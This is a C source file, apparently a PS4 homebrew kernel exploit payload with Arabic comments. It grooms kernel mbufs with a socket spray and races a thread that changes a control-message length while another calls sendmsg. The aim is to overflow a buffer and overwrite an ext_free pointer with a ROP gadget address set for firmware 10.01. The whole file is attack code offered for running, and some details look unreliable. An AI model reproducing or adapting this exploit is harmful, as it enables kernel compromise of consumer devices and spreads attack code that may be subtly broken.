#include <ps4.h>
//#include "payload_utils.h"

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define IP_RETOPTS 7
#define CONTROL_LEN 256
#define SPRAY_COUNT 128

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int spray_socks[SPRAY_COUNT];

// دالة لعمل Push (حجز mbufs في الذاكرة)
void push_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
        if(spray_socks[i] > 0) {
            // نرسل بيانات صغيرة لضمان حجز mbuf
            sendto(spray_socks[i], "A", 1, 0, NULL, 0);
        }
    }
}

// دالة لعمل Pop (تحرير بعض الـ mbufs لخلق ثقوب)
void pop_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); // close
            spray_socks[i] = -1;
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    while(1) {
        // محاولة استغلال الثغرة لكتابة الفائض
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   // القيمة العادية
        cmsg->cmsg_len = 0xFFFF; // القيمة التي تسبب الفيضان
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();
    initNetwork();

    // جلب عنوان النواة والقاعدة
    uint64_t kbase = get_kernel_base();
    // 10.01 JMP_RSI_GADGET = 0x68B1
    uint64_t target_gadget = kbase + 0x68B1; 

    global_sock = syscall(97, 2, 2, 0);
    
    // إعداد البايلود لاستهداف ext_free
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    // حقن عنوان الـ Gadget في أماكن استراتيجية داخل البفر لتعديل ext_free
    for (int i = 0x50; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = target_gadget;
    }

    // ترتيب الذاكرة (Grooming)
    push_mbufs();
    pop_mbufs();

    ScePthread thread1, thread2;

    // ملاحظة: الـ SDK يستخدم مسميات مختلفة للـ Affinity
    // سنقوم بإنشاء الخيوط بشكل مباشر
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");

    // بما أنك مجلبرك، يمكنك إرسال إشعار لرؤية الكود وهو يعمل
    sceKernelDebugOutText(0, "Exploit Started: Racing for ext_free...\n");

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    return 0;
}
